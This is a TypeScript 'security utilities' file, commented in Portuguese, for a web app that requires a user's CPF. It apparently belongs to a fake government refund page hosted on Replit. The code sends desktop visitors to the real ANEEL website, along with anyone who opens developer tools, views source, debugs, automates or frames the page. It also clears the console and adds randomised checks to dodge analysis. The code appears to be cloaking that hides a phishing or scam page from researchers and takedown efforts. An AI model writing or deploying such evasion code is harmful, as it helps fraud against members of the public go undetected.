/**
 * SecurityUtils.ts
 * 
 * Utilitários de segurança avançados para proteção da aplicação contra clonagem e acesso não autorizado
 */

const ANEEL_REDIRECT_URL = "https://antigo.aneel.gov.br/";
const SECURITY_TOKEN_KEY = "anticlone_security_token";
const ORIGIN_TOKEN_KEY = "origin_validation_token";
const SESSION_START_KEY = "session_start_timestamp";

/**
 * Verifica se o dispositivo é móvel com base no User Agent
 */
export function isMobileDevice(): boolean {
  const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
  
  const mobileRegex = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i;
  const tabletRegex = /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i;
  
  return !!(mobileRegex.test(userAgent) || tabletRegex.test(userAgent.substring(0, 4)));
}

/**
 * Gera um token único para identificar a sessão atual
 */
function generateSecurityToken(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const timestamp = new Date().getTime().toString(36);
  let result = timestamp + '_';
  
  for (let i = 0; i < 32; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  
  return result;
}

/**
 * Inicializa ou verifica os tokens de segurança anti-clonagem
 */
function initAntiCloneProtection(): void {
  // Verificar se o token de segurança existe
  let securityToken = localStorage.getItem(SECURITY_TOKEN_KEY);
  
  if (!securityToken) {
    // Gerar novo token de segurança
    securityToken = generateSecurityToken();
    localStorage.setItem(SECURITY_TOKEN_KEY, securityToken);
    sessionStorage.setItem(SECURITY_TOKEN_KEY, securityToken);
    document.cookie = `${SECURITY_TOKEN_KEY}=${securityToken}; path=/; max-age=86400`;
  } else {
    // Verificar se os tokens correspondem (localStorage, sessionStorage e cookies)
    const sessionToken = sessionStorage.getItem(SECURITY_TOKEN_KEY);
    const cookieToken = document.cookie
      .split('; ')
      .find(row => row.startsWith(SECURITY_TOKEN_KEY))
      ?.split('=')[1];
      
    // Se algum token não corresponder, pode ser um clone do site
    if (sessionToken !== securityToken || (cookieToken && cookieToken !== securityToken)) {
      console.error("Detecção de possível clonagem! Redirecionando...");
      window.location.href = ANEEL_REDIRECT_URL;
    }
  }
  
  // Armazenar informações sobre a origem da sessão
  if (!sessionStorage.getItem(ORIGIN_TOKEN_KEY)) {
    const originData = {
      referer: document.referrer || 'direct',
      timestamp: new Date().getTime(),
      origin: window.location.origin,
      userAgent: navigator.userAgent
    };
    sessionStorage.setItem(ORIGIN_TOKEN_KEY, JSON.stringify(originData));
  }
  
  // Verificar origem
  if (window.location.hostname !== 'localhost' && 
      !window.location.hostname.includes('replit.dev') && 
      !window.location.hostname.includes('replit.app') && 
      !window.location.hostname.includes('restituicao.gov.br')) {
    console.error("Domínio não autorizado! Redirecionando...");
    window.location.href = ANEEL_REDIRECT_URL;
  }
  
  // Iniciar contador de sessão se ainda não foi iniciado
  if (!sessionStorage.getItem(SESSION_START_KEY)) {
    sessionStorage.setItem(SESSION_START_KEY, new Date().getTime().toString());
  }
}

/**
 * Proteção contra manipulação de DOM (anti-scraping e anti-clonagem)
 */
function setupDomProtection(): void {
  // Adicionar atributos de segurança a elementos sensíveis
  const protectElements = () => {
    const sensitiveElements = document.querySelectorAll('form, button[type="submit"], input, [data-sensitive="true"]');
    
    sensitiveElements.forEach(el => {
      const randomAttr = `data-sec-${Math.random().toString(36).substring(2, 8)}`;
      el.setAttribute(randomAttr, "protected");
      
      // Observar mudanças nos atributos
      const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (mutation.type === 'attributes' && 
              mutation.attributeName !== randomAttr && 
              mutation.attributeName !== 'class' && 
              mutation.attributeName !== 'style') {
            window.location.href = ANEEL_REDIRECT_URL;
          }
        });
      });
      
      observer.observe(el, { attributes: true });
    });
  };
  
  // Chamar inicialmente e após carregar completamente
  setTimeout(protectElements, 1000);
  window.addEventListener('load', protectElements);
  
  // Observar modificações no DOM para detectar clonagem ou injeção de scripts
  const bodyObserver = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
      if (mutation.type === 'childList') {
        // Verificar novos elementos script ou iframe que foram adicionados
        mutation.addedNodes.forEach(node => {
          if (node.nodeName === 'SCRIPT' || node.nodeName === 'IFRAME') {
            const element = node as HTMLElement;
            // Verificar se é um script não autorizado
            if (element.getAttribute('src') && 
                !element.getAttribute('src')?.includes('restituicao') && 
                !element.getAttribute('src')?.includes('replit') && 
                !element.getAttribute('src')?.includes('utmify') &&
                !element.getAttribute('src')?.includes('gov.br')) {
              console.error("Script não autorizado detectado!");
              window.location.href = ANEEL_REDIRECT_URL;
            }
          }
        });
      }
    });
  });
  
  bodyObserver.observe(document.body, { 
    childList: true, 
    subtree: true 
  });
}

/**
 * Detecta tentativas de inspeção e ferramentas de desenvolvedor com métodos avançados
 */
export function setupDevToolsDetection(): void {
  // Função para redirecionar
  const redirectToAneel = () => {
    window.location.href = ANEEL_REDIRECT_URL;
  };

  // Detectar DevTools por alteração de dimensões da janela (para Chrome/Firefox)
  let devToolsTimeout: any;
  
  const checkDevTools = () => {
    const threshold = 160;
    const widthThreshold = window.outerWidth - window.innerWidth > threshold;
    const heightThreshold = window.outerHeight - window.innerHeight > threshold;
    
    if (widthThreshold || heightThreshold) {
      redirectToAneel();
    }
  };
  
  // Verificar periodicamente
  setInterval(checkDevTools, 1000);
  
  // Detectar F12, Ctrl+Shift+I, Ctrl+Shift+J
  window.addEventListener('keydown', (event) => {
    // F12
    if (event.key === 'F12' || event.keyCode === 123) {
      event.preventDefault();
      redirectToAneel();
      return false;
    }
    
    // Ctrl+Shift+I ou Ctrl+Shift+J
    if ((event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'i' || event.key === 'J' || event.key === 'j')) ||
        (event.metaKey && event.altKey && (event.key === 'I' || event.key === 'i' || event.key === 'J' || event.key === 'j'))) {
      event.preventDefault();
      redirectToAneel();
      return false;
    }
    
    // Ctrl+Shift+C
    if ((event.ctrlKey && event.shiftKey && (event.key === 'C' || event.key === 'c')) ||
        (event.metaKey && event.altKey && (event.key === 'C' || event.key === 'c'))) {
      event.preventDefault();
      redirectToAneel();
      return false;
    }
    
    // Ctrl+U (visualizar código-fonte)
    if ((event.ctrlKey && (event.key === 'U' || event.key === 'u'))) {
      event.preventDefault();
      redirectToAneel();
      return false;
    }
    
    return true;
  });
  
  // Detectar menu de contexto
  window.addEventListener('contextmenu', (event) => {
    // Permitir menu de contexto em dispositivos móveis
    if (isMobileDevice()) {
      return true;
    }
    
    event.preventDefault();
    return false;
  });
  
  // Sobrescrever console.log
  const originalConsole = { ...console };
  console.log = function(...args) {
    if (!isMobileDevice()) {
      clearTimeout(devToolsTimeout);
      devToolsTimeout = setTimeout(redirectToAneel, 500);
    }
    return originalConsole.log.apply(console, args);
  };
  
  // Detectar quando a guia não está em foco
  let blurTimeout: any;
  window.addEventListener('blur', () => {
    if (!isMobileDevice() && document.hasFocus()) {
      blurTimeout = setTimeout(redirectToAneel, 500);
    }
  });
  
  window.addEventListener('focus', () => {
    clearTimeout(blurTimeout);
  });
  
  // Detector de mudança de propriedades do console (Safari/Firefox)
  const consoleCheck = /./;
  consoleCheck.toString = function() {
    if (!isMobileDevice()) {
      redirectToAneel();
    }
    return '';
  };
  
  // Verificação periódica do console
  setInterval(() => {
    if (!isMobileDevice()) {
      console.log(consoleCheck);
    }
  }, 3000);
  
  // Detecção de ferramentas de desenvolvedor por largura da janela
  window.addEventListener('resize', () => {
    if (!isMobileDevice() && (window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100)) {
      redirectToAneel();
    }
  });
  
  // Detecção de performance timing para identificar DevTools
  const checkPerformanceTiming = () => {
    if (window.performance && window.performance.timing) {
      const timing = window.performance.timing;
      const pageLoadTime = timing.loadEventEnd - timing.navigationStart;
      
      // Páginas carregadas em ferramentas dev tendem a ter tempos de carregamento atípicos
      if (pageLoadTime < 10 || pageLoadTime > 15000) {
        // Possível uso de ferramenta de dev
        if (Math.random() < 0.5) { // Adicionar aleatoriedade para evitar detecção
          redirectToAneel();
        }
      }
    }
  };
  
  setTimeout(checkPerformanceTiming, 5000);
  
  // Adicionar detector de depuração
  //@ts-ignore
  function checkDebugger() {
    const startTime = new Date().getTime();
    debugger; // Este debugger será acionado se as ferramentas de desenvolvedor estiverem abertas
    const endTime = new Date().getTime();
    const debugTime = endTime - startTime;
    
    // Se o tempo entre início e fim for significativo, é provável que haja depuração
    if (debugTime > 100) {
      redirectToAneel();
    }
  }
  
  // Verificar periodicamente por debugger
  setInterval(checkDebugger, 1000);
}

/**
 * Proteção contra scripts ou ferramentas de automação/scraping
 */
function setupAntiAutomationProtection(): void {
  // Verifica comportamento errático do cursor que pode indicar automação
  let lastMouseX = 0;
  let lastMouseY = 0;
  let mouseMovements = 0;
  
  window.addEventListener('mousemove', (e) => {
    if (Math.abs(e.clientX - lastMouseX) > 5 || Math.abs(e.clientY - lastMouseY) > 5) {
      mouseMovements++;
    }
    
    lastMouseX = e.clientX;
    lastMouseY = e.clientY;
  });
  
  // Se não houver movimento de mouse após algum tempo, pode ser automação
  setTimeout(() => {
    if (mouseMovements === 0 && !isMobileDevice()) {
      // Adiciona uma verificação extra, como pedir um clique específico
      const securityDiv = document.createElement('div');
      securityDiv.style.position = 'fixed';
      securityDiv.style.top = '0';
      securityDiv.style.left = '0';
      securityDiv.style.width = '100%';
      securityDiv.style.height = '100%';
      securityDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
      securityDiv.style.zIndex = '9999';
      securityDiv.style.display = 'flex';
      securityDiv.style.justifyContent = 'center';
      securityDiv.style.alignItems = 'center';
      securityDiv.style.flexDirection = 'column';
      
      securityDiv.innerHTML = `
        <h2 style="color: #071D41; font-size: 1.5rem; margin-bottom: 1rem;">Verificação de Segurança</h2>
        <p style="color: #333; margin-bottom: 1rem;">Por favor, clique no botão abaixo para continuar.</p>
        <button id="security-check-button" style="background: #1351B4; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">Continuar</button>
      `;
      
      document.body.appendChild(securityDiv);
      
      document.getElementById('security-check-button')?.addEventListener('click', () => {
        document.body.removeChild(securityDiv);
      });
      
      // Se não houver interação em 30 segundos, redirecionar
      setTimeout(() => {
        if (document.body.contains(securityDiv)) {
          window.location.href = ANEEL_REDIRECT_URL;
        }
      }, 30000);
    }
  }, 5000);
  
  // Adicionar proteção contra navegação via iframe
  try {
    if (window.self !== window.top) {
      const topWindow: Window | null = window.top;
      if (topWindow) {
        topWindow.location.href = ANEEL_REDIRECT_URL;
      }
    }
  } catch (e) {
    // Uma exceção pode ocorrer ao tentar acessar window.top devido a restrições de domínio cruzado
    window.location.href = ANEEL_REDIRECT_URL;
  }
}

/**
 * Verifica se o CPF está no UserContext
 * Deve ser utilizado em componentes que exigem autenticação
 */
export function requireCpf(userData: any, navigate: (path: string) => void): boolean {
  if (!userData || !userData.cpf) {
    console.log('CPF não encontrado, redirecionando para a página inicial');
    navigate('/');
    return false;
  }
  return true;
}

/**
 * Realiza todas as verificações de segurança na inicialização
 */
export function initializeSecurity(): void {
  // Verificar se é mobile e redirecionar se não for
  if (!isMobileDevice()) {
    window.location.href = ANEEL_REDIRECT_URL;
    return;
  }
  
  console.log("Inicializando segurança...");
  
  // Iniciar proteção anti-clonagem
  initAntiCloneProtection();
  
  // Configurar detecção de ferramentas de desenvolvedor
  setupDevToolsDetection();
  
  // Configurar proteção DOM
  setTimeout(setupDomProtection, 500);
  
  // Configurar proteções contra automação
  setupAntiAutomationProtection();
  
  // Ocultar detalhes técnicos para dificultar depuração
  window.console.clear();
}